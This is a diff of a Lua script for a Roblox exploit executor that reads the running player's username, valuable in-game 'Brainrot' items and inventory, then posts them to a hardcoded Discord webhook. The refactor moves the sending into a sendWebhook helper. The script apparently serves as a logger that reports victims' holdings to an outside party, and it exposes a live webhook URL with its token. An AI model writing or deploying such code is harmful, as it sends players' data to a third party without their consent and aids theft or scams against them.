@@ -1,131 +1,99 @@
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
-
 local localPlayer = Players.LocalPlayer
 
--- Список названий Brainrots, которые нужно отправлять
-local allowedBrainrots = {
-    "Los Tralaleritos",
-    "Garamararam",
-    "Vacca Saturno Saturnita",
-    "Blueberrinni Octopussini",
-    "67",
-    "Pot Hotspot",
-    "Dragon Cannelloni",
-    "Brri Brri Dicus Bombicus",
-    "Crazylone Pizalone"
-}
+-- Универсальная функция для отправки HTTP
+local function sendWebhook(data)
+    local req = (syn and syn.request) or (request) or (http_request) or (fluxus and fluxus.request)
+    if not req then
+        warn("❌ HTTP request функция не найдена!")
+        return
+    end
+
+    req({
+        Url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end
 
 -- === Поиск своего плота ===
 local function findPlayerPlot()
     local plots = Workspace:FindFirstChild("Plots")
     if not plots then return nil end
-
     for _, plot in ipairs(plots:GetChildren()) do
-        if plot:FindFirstChild("PlayerSign") and plot.PlayerSign:FindFirstChild("BillboardGui") then
-            local label = plot.PlayerSign.BillboardGui:FindFirstChild("TextLabel")
-            if label and label.Text == localPlayer.DisplayName then
-                return plot
-            end
-        end
+        local label = plot:FindFirstChild("PlayerSign") and plot.PlayerSign:FindFirstChild("BillboardGui") and plot.PlayerSign.BillboardGui:FindFirstChild("TextLabel")
+        if label and label.Text == localPlayer.DisplayName then return plot end
     end
     return nil
 end
 
--- === Сбор Brainrots по фильтру ===
-local function collectBrainrots(plot)
-    local brainrotsText = ""
-    local container = plot:FindFirstChild("Brainrots")
-    if not container then
-        return ""
-    end
+-- === Brainrots фильтр ===
+local allowedBrainrots = {
+    "Los Tralaleritos","Garamararam","Vacca Saturno Saturnita",
+    "Blueberrinni Octopussini","67","Pot Hotspot",
+    "Dragon Cannelloni","Brri Brri Dicus Bombicus","Crazylone Pizalone"
+}
 
-    for i = 1, 17 do
+local function collectBrainrots(plot)
+    local text = ""
+    local container = plot and plot:FindFirstChild("Brainrots")
+    if not container then return "" end
+    for i = 1,17 do
         local node = container:FindFirstChild(tostring(i))
         if node and node:FindFirstChild("Brainrot") then
-            local br = node.Brainrot
-            local ui = br:FindFirstChild("PlatformUI")
+            local ui = node.Brainrot:FindFirstChild("PlatformUI")
             if ui and ui:FindFirstChild("Title") then
-                local text = ui.Title.Text
-                if text and text ~= "" then
-                    for _, allowed in ipairs(allowedBrainrots) do
-                        if string.find(text, allowed) then
-                            brainrotsText = brainrotsText .. ("Brainrot %d: %s\n"):format(i, text)
-                            break
-                        end
+                local t = ui.Title.Text
+                for _, allowed in ipairs(allowedBrainrots) do
+                    if t and string.find(t, allowed) then
+                        text = text .. ("Brainrot %d: %s\n"):format(i, t)
+                        break
                     end
                 end
             end
         end
     end
-
-    return brainrotsText
+    return text
 end
 
--- === Сбор инвентаря с фильтром Shovel и Bat ===
+-- === Инвентарь (без Shovel и Bat) ===
 local function collectInventory()
-    local invText = ""
     local items = {}
-
-    local function addItemsFrom(container)
+    local function add(container)
         if not container then return end
         for _, item in ipairs(container:GetChildren()) do
             if item:IsA("Tool") then
                 local nameLower = item.Name:lower()
-                if not string.find(nameLower, "shovel") and not string.find(nameLower, "bat") then
-                    table.insert(items, item.Name)
+                if not string.find(nameLower,"shovel") and not string.find(nameLower,"bat") then
+                    table.insert(items,item.Name)
                 end
             end
         end
     end
-
-    addItemsFrom(localPlayer:FindFirstChild("Backpack"))
-    addItemsFrom(localPlayer.Character)
-
-    if #items > 0 then
-        invText = "\n--- Inventory ---\n"
-        for _, name in ipairs(items) do
-            invText = invText .. "- " .. name .. "\n"
-        end
-    end
-
+    add(localPlayer:FindFirstChild("Backpack"))
+    add(localPlayer.Character)
+    if #items == 0 then return "" end
+    local invText = "\n--- Inventory ---\n"
+    for _, v in ipairs(items) do invText = invText .. "- "..v.."\n" end
     return invText
 end
 
--- === Основной запуск ===
+-- === Основной сбор ===
 local plot = findPlayerPlot()
-local brainrots = plot and collectBrainrots(plot) or ""
-local inventory = collectInventory()
-local combined = brainrots .. inventory
+local combined = collectBrainrots(plot) .. collectInventory()
+if combined == "" then combined = "⚠️ Пусто" end
 
-if combined == "" then
-    combined = "⚠️ Пусто"
-end
-
--- === Отправка в Discord ===
-request({
-    Url = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep",
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = HttpService:JSONEncode({
-        ["embeds"] = {{
-            ["title"] = "**Brainrots + Inventory Report**",
-            ["color"] = 65280,
-            ["fields"] = {
-                {
-                    ["name"] = "👤 Username",
-                    ["value"] = localPlayer.Name,
-                    ["inline"] = false
-                },
-                {
-                    ["name"] = "🪐 Brainrots + Inventory",
-                    ["value"] = combined,
-                    ["inline"] = false
-                }
-            }
-        }}
-    })
+-- === Отправка ===
+sendWebhook({
+    ["embeds"] = {{
+        ["title"] = "**Brainrots + Inventory Report**",
+        ["color"] = 65280,
+        ["fields"] = {
+            {["name"]="👤 Username",["value"]=localPlayer.Name,["inline"]=false},
+            {["name"]="🪐 Brainrots + Inventory",["value"]=combined,["inline"]=false}
+        }
+    }}
 })
